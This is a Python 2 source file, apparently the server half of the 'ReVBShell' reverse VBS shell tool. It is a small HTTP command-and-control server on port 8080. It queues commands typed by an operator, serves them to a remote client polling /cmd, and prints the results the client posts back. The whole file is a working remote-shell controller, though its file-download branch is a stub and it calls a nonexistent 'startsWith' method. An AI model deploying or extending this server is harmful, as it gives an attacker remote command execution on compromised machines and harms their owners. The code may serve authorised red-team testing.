#!/usr/bin/python
#
# This software is provided under under the BSD 3-Clause License.
# See the accompanying LICENSE file for more information.
#
# Server for Reverse VBS Shell
#
# Author:
#  Arris Huijgen
#
# Website:
#  https://github.com/bitsadmin/ReVBShell
#

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from urlparse import parse_qs
from Queue import Queue
from threading import Thread

PORT_NUMBER = 8080


class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        command = self.path
        if command == '/cmd':
            if commands.empty():
                content = 'NOOP'
            else:
                cmd = commands.get()
                content = 'CMD\r\n%s' % cmd
        elif command.startsWith('/f/'):
            # Perform file download
            content = 'Somefile'

        # Return result
        self.send_response(200)
        self.send_header('content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(content)
        return

    # Result from executing command
    def do_POST(self):
        length = int(self.headers['content-length'])
        result = parse_qs(self.rfile.read(length), keep_blank_values=1)['result'][0]
        print result
        self.send_response(200)
        self.send_header('content-type', 'text/plain')
        self.end_headers()
        self.wfile.write('OK')
        return


def run_httpserver():
    #commands.put('dir C:\\')
    server = HTTPServer(('', PORT_NUMBER), myHandler)
    server.serve_forever()

commands = Queue()

try:
    # Start HTTP server thread
    #run_httpserver() - Run without treads for debugging purposes
    httpserver = Thread(target=run_httpserver)
    httpserver.start()

    # Loop to add new commands
    while True:
        s = raw_input("> ")
        if s.strip() != '':
            commands.put(s)

except KeyboardInterrupt:
    print '^C received'
    #server.socket.close()
